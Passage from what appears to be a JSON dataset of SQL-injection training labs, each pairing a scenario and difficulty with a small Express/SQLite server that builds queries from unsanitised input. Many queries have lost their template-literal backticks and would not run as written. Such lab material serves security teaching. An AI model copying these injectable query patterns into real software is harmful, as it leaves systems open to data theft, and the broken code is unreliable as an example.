  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst axios = require('axios');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE logs (id INTEGER PRIMARY KEY, info TEXT)\");\n  db.run(\"INSERT INTO logs (info) VALUES ('logDataXYZ')\");\n});\n\napp.post('/remoteLog', (req, res) => {\n  const param = req.body.param;\n  const query = SELECT * FROM logs WHERE info = '${param}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else {\n      axios.post('http://logging.example.com/api/log', { data: rows[0].info })\n        .then(() => res.send('Remote logging triggered'))\n        .catch(() => res.status(500).send('Remote logging failed'));\n    }\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in a mobile app backend for user profiles",
  "Lab Description": "This lab simulates a mobile application backend where the API for retrieving user profiles is vulnerable to SQL injection due to unsanitized input parameters. Exploit the vulnerability to extract profile information.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE profiles (id INTEGER PRIMARY KEY, username TEXT, email TEXT)\");\n  db.run(\"INSERT INTO profiles (username, email) VALUES ('user1', 'user1@example.com')\");\n});\n\napp.post('/profile', (req, res) => {\n  const username = req.body.username;\n  const query = SELECT * FROM profiles WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in a legacy PHP system simulated in Node.js",
  "Lab Description": "This lab emulates a legacy PHP system's behavior using Node.js, where the system constructs SQL queries unsafely. Attackers can exploit the vulnerability to gain unauthorized access to data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE legacy_users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO legacy_users (username, password) VALUES ('legacyAdmin', 'legacyPass')\");\n});\n\napp.post('/legacyLogin', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = \"SELECT * FROM legacy_users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else if (rows.length > 0) res.send('Login successful');\n    else res.send('Login failed');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in password reset module",
  "Lab Description": "This lab demonstrates a vulnerability in a password reset feature where the user's email input is unsanitized. An attacker can inject SQL to reset the password of any user, such as the administrator.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup database with a users table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (email, password) VALUES ('admin@example.com', 'oldpassword')\");\n});\n\napp.post('/resetPassword', (req, res) => {\n  const email = req.body.email;\n  const newPassword = req.body.newPassword;\n  // Vulnerable query: unsanitized input\n  const query = UPDATE users SET password = '${newPassword}' WHERE email = '${email}';\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Password reset successful');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in event booking system",
  "Lab Description": "This lab simulates an event booking system where the seat number is passed unsanitized into the SQL query. An attacker can inject SQL to bypass seat availability checks and book seats without authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup a bookings table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE bookings (id INTEGER PRIMARY KEY, seat TEXT, booked INTEGER)\");\n  db.run(\"INSERT INTO bookings (seat, booked) VALUES ('A1', 0)\");\n});\n\napp.post('/book', (req, res) => {\n  const seat = req.body.seat;\n  // Vulnerable query: direct concatenation of user input\n  const query = UPDATE bookings SET booked = 1 WHERE seat = '${seat}';\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Seat booked');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in social network user search",
  "Lab Description": "This lab demonstrates a vulnerability in a social network\u2019s user search feature. Unsanitized search terms allow an attacker to inject SQL and retrieve all user profiles from the database.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup users table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, bio TEXT)\");\n  db.run(\"INSERT INTO users (name, bio) VALUES ('Alice', 'Loves coding')\");\n});\n\napp.get('/searchUsers', (req, res) => {\n  const keyword = req.query.keyword;\n  // Vulnerable query using unsanitized keyword in a LIKE clause\n  const query = SELECT * FROM users WHERE name LIKE '%${keyword}%';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order tracking system",
  "Lab Description": "This lab simulates an order tracking system where the order ID is provided via query parameters without sanitization. An attacker can inject SQL to view details of orders that do not belong to them.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup orders table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, details TEXT)\");\n  db.run(\"INSERT INTO orders (details) VALUES ('Order for user1')\");\n});\n\napp.get('/trackOrder', (req, res) => {\n  const orderId = req.query.orderId;\n  // Vulnerable query using unsanitized orderId\n  const query = SELECT * FROM orders WHERE id = '${orderId}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product review filter",
  "Lab Description": "This lab features a product review filter where user-supplied rating is directly used in the SQL query. Attackers can manipulate the input to retrieve all reviews or inject extra conditions.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup reviews table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reviews (id INTEGER PRIMARY KEY, rating INTEGER, comment TEXT)\");\n  db.run(\"INSERT INTO reviews (rating, comment) VALUES (5, 'Excellent product!')\");\n});\n\napp.post('/filterReviews', (req, res) => {\n  const rating = req.body.rating;\n  // Vulnerable query: unsanitized input used in the WHERE clause\n  const query = SELECT * FROM reviews WHERE rating = ${rating};\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in bulk user import module",
  "Lab Description": "This lab simulates a bulk user import feature where CSV data is processed without proper sanitization. The unsanitized data is concatenated into SQL queries, allowing injection of additional SQL commands.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.text());\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup users table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\");\n});\n\napp.post('/importUsers', (req, res) => {\n  // Simulated CSV input: each line is \"name,email\"\n  const data = req.body.split('\\n');\n  data.forEach(line => {\n    const [name, email] = line.split(\",\");\n    const query = INSERT INTO users (name, email) VALUES ('${name}', '${email}');\n    console.log('Executing query:', query);\n    db.run(query);\n  });\n  res.send('Users imported');\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in forum thread deletion endpoint",
  "Lab Description": "This lab simulates a forum where thread deletion is based on a thread ID provided by the user. The unsanitized input allows attackers to inject SQL to delete multiple threads.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup forum threads table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE threads (id INTEGER PRIMARY KEY, title TEXT)\");\n  db.run(\"INSERT INTO threads (title) VALUES ('General Discussion')\");\n});\n\napp.post('/deleteThread', (req, res) => {\n  const threadId = req.body.threadId;\n  // Vulnerable query: unsanitized threadId\n  const query = DELETE FROM threads WHERE id = '${threadId}';\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Thread deleted');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in API for retrieving user statistics",
  "Lab Description": "This lab simulates an API endpoint that retrieves user statistics based on unsanitized parameters. Attackers can inject SQL to retrieve statistics for all users.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\n// Setup statistics table\ndb.serialize(() => {\n  db.run(\"CREATE TABLE statistics (id INTEGER PRIMARY KEY, user TEXT, visits INTEGER)\");\n  db.run(\"INSERT INTO statistics (user, visits) VALUES ('user1', 100)\");\n});\n\napp.post('/stats', (req, res) => {\n  const user = req.body.user;\n  // Vulnerable query using unsanitized user input\n  const query = SELECT * FROM statistics WHERE user = '${user}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product inventory update via GET parameters",
  "Lab Description": "This lab simulates a product inventory update endpoint that uses GET parameters without sanitization. Attackers can inject SQL to alter inventory levels arbitrarily.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\n\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE inventory (id INTEGER PRIMARY KEY, product TEXT, stock INTEGER)\");\n  db.run(\"INSERT INTO inventory (product, stock) VALUES ('Camera', 15)\");\n});\n\napp.get('/updateInventory', (req, res) => {\n  const product = req.query.product;\n  const stock = req.query.stock;\n  // Vulnerable query using GET parameters unsanitized\n  const query = UPDATE inventory SET stock = ${stock} WHERE product = '${product}';\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Inventory updated');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in financial report retrieval module",
  "Lab Description": "This lab simulates a financial report retrieval system where the report type is provided by the user unsanitized. Attackers can inject SQL to retrieve confidential financial data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reports (id INTEGER PRIMARY KEY, type TEXT, data TEXT)\");\n  db.run(\"INSERT INTO reports (type, data) VALUES ('financial', 'Confidential Data')\");\n});\n\napp.post('/getReport', (req, res) => {\n  const type = req.body.type;\n  // Vulnerable query using unsanitized report type\n  const query = SELECT * FROM reports WHERE type = '${type}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with filter bypass via XML encoding",
  "Lab Description": "This lab contains a SQL injection vulnerability in its stock check feature. The application returns query results in the response, allowing a UNION attack to retrieve data from the users table. Exploit this vulnerability to retrieve the administrator's credentials.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n  db.run(\"CREATE TABLE stock (id INTEGER PRIMARY KEY, product TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO stock (product, quantity) VALUES ('Laptop', 10)\");\n  db.run(\"INSERT INTO stock (product, quantity) VALUES ('Phone', 20)\");\n});\n\napp.post('/stock', (req, res) => {\n  xml2js.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send(\"Invalid XML\");\n      return;\n    }\n    const product = result.stock.product[0];\n    const query = SELECT product, quantity FROM stock WHERE product = '${product}';\n    console.log(\"Executing query:\", query);\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.json(rows);\n      }\n    });\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection in a login form without sanitization",
  "Lab Description": "This lab contains a login form that directly uses user input in SQL queries without sanitization. This lack of validation allows attackers to inject SQL code to bypass authentication. Exploit the vulnerability to log in as an administrator.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user', 'userpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (rows.length > 0) {\n      res.send(\"Login successful\");\n    } else {\n      res.send(\"Login failed\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection with multiple statement execution vulnerability",
  "Lab Description": "This lab demonstrates a vulnerability where user input is concatenated into an SQL command that allows execution of multiple SQL statements. Exploit this vulnerability to execute unauthorized statements, such as dropping tables or extracting confidential data.",
  "Vulnerability name": "SQL Injection (Multiple Statement)",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/execute', (req, res) => {\n  const input = req.body.input;\n  // Vulnerable to injection of multiple statements\n  const query = BEGIN; SELECT * FROM users; ${input}; COMMIT;;\n  console.log(\"Executing query:\", query);\n  db.exec(query, (err) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.send(\"Query executed successfully.\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection due to improper parameter handling",
  "Lab Description": "This lab demonstrates how the failure to use parameterized queries can lead to SQL injection. The application concatenates user input into a query, allowing attackers to bypass authentication. Exploit this vulnerability to gain unauthorized access.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Vulnerable query without parameterization\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (rows.length > 0) {\n      res.send(\"Login successful\");\n    } else {\n      res.send(\"Login failed\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection exploiting subqueries",
  "Lab Description": "This lab targets an API that uses subqueries to fetch data. Poor handling of user input within subqueries creates a vulnerability. Exploit the vulnerability to retrieve data from a hidden table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, product TEXT, price REAL)\");\n  db.run(\"INSERT INTO orders (product, price) VALUES ('Laptop', 1200.00)\");\n  db.run(\"CREATE TABLE secret (info TEXT)\");\n  db.run(\"INSERT INTO secret (info) VALUES ('Top Secret Data')\");\n});\n\napp.post('/order', (req, res) => {\n  const product = req.body.product;\n  // Vulnerable subquery injection\n  const query = SELECT product, price FROM orders WHERE id IN (SELECT id FROM secret WHERE info = '${product}');\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection in search functionality",
  "Lab Description": "This lab simulates a search feature that is vulnerable to SQL injection. User input is directly inserted into the SQL query without sanitization, allowing attackers to retrieve additional information by manipulating the query. Exploit this vulnerability to extract hidden data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Laptop', 1200.00)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Phone', 800.00)\");\n});\n\napp.get('/search', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = SELECT * FROM products WHERE name = '${keyword}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(err.message);\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection in API endpoint for product retrieval",
  "Lab Description": "This lab features an API endpoint that retrieves product information based on user input. The lack of proper parameterization creates a vulnerability that can be exploited to access data from other tables. Exploit the vulnerability to retrieve additional product details.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Tablet', 500.00)\");\n  db.run(\"CREATE TABLE details (product_id INTEGER, description TEXT)\");\n  db.run(\"INSERT INTO details (product_id, description) VALUES (1, 'High resolution display')\");\n});\n\napp.post('/getProduct', (req, res) => {\n  const name = req.body.name;\n  const query = SELECT * FROM products WHERE name = '${name}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (rows.length > 0) {\n      // Vulnerability: attacker can append a UNION to extract details\n      const unionQuery = query + \" UNION SELECT null, description, null FROM details\";\n      db.all(unionQuery, [], (err, unionRows) => {\n        if (err) {\n          res.status(500).send(\"Error during UNION attack.\");\n        } else {\n          res.json(unionRows);\n        }\n      });\n    } else {\n      res.send(\"No product found.\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection vulnerability in stored procedure execution",
  "Lab Description": "This lab simulates a scenario where a stored procedure is executed using unsanitized user input. The dynamic construction of the stored procedure call makes it vulnerable to SQL injection. Exploit the vulnerability to alter the stored data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "// Note: SQLite does not support stored procedures, so we simulate the behavior\nconst express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, item TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (item, quantity) VALUES ('Monitor', 5)\");\n});\n\n// Simulated stored procedure call vulnerable to SQL injection\napp.post('/updateOrder', (req, res) => {\n  const newQuantity = req.body.quantity;\n  // Vulnerable dynamic SQL for stored procedure simulation\n  const query = UPDATE orders SET quantity = ${newQuantity} WHERE id = 1;\n  console.log(\"Executing query:\", query);\n  db.run(query, function(err) {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.send(Order updated, changes: ${this.changes});\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection with boolean-based blind attack",
  "Lab Description": "This lab showcases a boolean-based blind SQL injection vulnerability. By injecting conditional logic into the query, the attacker can infer the existence of data based on the application's responses. Exploit the vulnerability to deduce sensitive information from the database.",
  "Vulnerability name": "Blind SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, username TEXT, secret TEXT)\");\n  db.run(\"INSERT INTO accounts (username, secret) VALUES ('admin', 's3cr3t')\");\n});\n\napp.post('/check', (req, res) => {\n  const condition = req.body.condition; // e.g., '1=1' or '1=0'\n  const query = SELECT CASE WHEN (${condition}) THEN 'True' ELSE 'False' END as result;\n  console.log(\"Executing query:\", query);\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.send(row.result);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection via string concatenation in update queries",
  "Lab Description": "This lab illustrates a vulnerability in an update query where user input is concatenated directly, allowing attackers to manipulate the SQL command. Exploit this vulnerability to change data in the database without proper authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE inventory (id INTEGER PRIMARY KEY, item TEXT, stock INTEGER)\");\n  db.run(\"INSERT INTO inventory (item, stock) VALUES ('Keyboard', 50)\");\n});\n\napp.post('/updateStock', (req, res) => {\n  const item = req.body.item;\n  const newStock = req.body.newStock;\n  const query = UPDATE inventory SET stock = ${newStock} WHERE item = '${item}';\n  console.log(\"Executing query:\", query);\n  db.run(query, function(err) {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.send(Stock updated for ${item});\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection with dynamic query generation in a report module",
  "Lab Description": "This lab simulates a report generation module where SQL queries are built dynamically from user input. The lack of input validation creates an SQL injection risk. Exploit the vulnerability to alter or extract report data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reports (id INTEGER PRIMARY KEY, title TEXT, content TEXT)\");\n  db.run(\"INSERT INTO reports (title, content) VALUES ('Sales Report', 'Revenue details')\");\n});\n\napp.post('/report', (req, res) => {\n  const filter = req.body.filter; // user-provided filter for the report\n  const query = SELECT * FROM reports WHERE title LIKE '%${filter}%';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection via comment termination",
  "Lab Description": "This lab demonstrates a SQL injection vulnerability where an attacker can terminate a SQL comment to manipulate the query logic. The application fails to filter out comment delimiters properly, allowing additional SQL commands to be appended.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Vulnerable query: attacker can inject a comment terminator\n  const query = \"SELECT * FROM users WHERE username = '\" + username + \"' -- \" + \"AND password = '\" + password + \"'\";\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection via tautology-based attack",
  "Lab Description": "This lab allows attackers to bypass authentication by injecting a tautological condition such as 'OR 1=1'. The application concatenates user input directly into the query without sanitization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
